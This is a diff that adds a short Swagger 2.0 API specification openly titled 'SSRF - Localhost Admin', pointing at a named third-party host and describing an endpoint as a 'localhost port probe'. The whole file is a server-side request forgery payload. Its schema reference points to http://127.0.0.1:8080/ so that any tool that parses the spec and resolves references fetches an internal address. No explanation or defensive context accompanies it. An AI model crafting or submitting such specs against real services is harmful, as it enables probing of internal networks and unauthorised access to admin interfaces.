@@ -1,0 +1,16 @@
+swagger: "2.0"
+info:
+  title: "SSRF - Localhost Admin"
+  version: "1.0"
+host: "api.tektiklaode.visa.com.tr"
+schemes:
+  - https
+paths:
+  /admin-check:
+    get:
+      summary: "Trigger localhost port probe"
+      responses:
+        200:
+          description: "Try SSRF to localhost:8080"
+          schema:
+            $ref: "http://127.0.0.1:8080/"
